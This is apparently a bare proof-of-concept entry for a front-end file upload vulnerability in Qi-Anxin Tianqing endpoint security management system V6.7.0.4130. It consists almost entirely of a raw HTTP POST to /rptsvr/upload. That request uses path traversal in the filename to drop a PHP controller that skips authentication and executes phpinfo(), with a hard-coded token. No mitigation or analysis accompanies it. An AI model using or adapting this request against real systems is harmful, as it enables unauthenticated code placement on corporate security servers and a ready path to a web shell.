# 奇安信天擎终端安全管理系统 V6.7.0.4130 rptsvr upload 前台文件上传漏洞

    ```
POST /rptsvr/upload HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type:
boundary=---------------------------55433477442814818502792421460 Content-Length: 388
Connection: close
Cookie: SKYLARa7e3918c30fdaa641ea1fc2f0c=iouj4m7as0bi041r7eeip52tv0; YII_CSRF_TOKEN=451a827a59b5e2917bf1e1681ac7ba7d1351d346s%3A40%3A%22ec274984d6d6008386d91 140b21666bc52ad1d0f%22%3B
Upgrade-Insecure-Requests: 1

-----------------------------55433477442814818502792421460
Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/TController.php" 
Content-Type: text/x-python

<?php
class TController extends BaseApiController {
protected function beforeAction($action) {
return true; }
public function actionT() {
phpinfo(); }
}
?>
-----------------------------55433477442814818502792421460 
Content-Disposition: form-data; name="token"

skylar_report 
-----------------------------55433477442814818502792421460
```
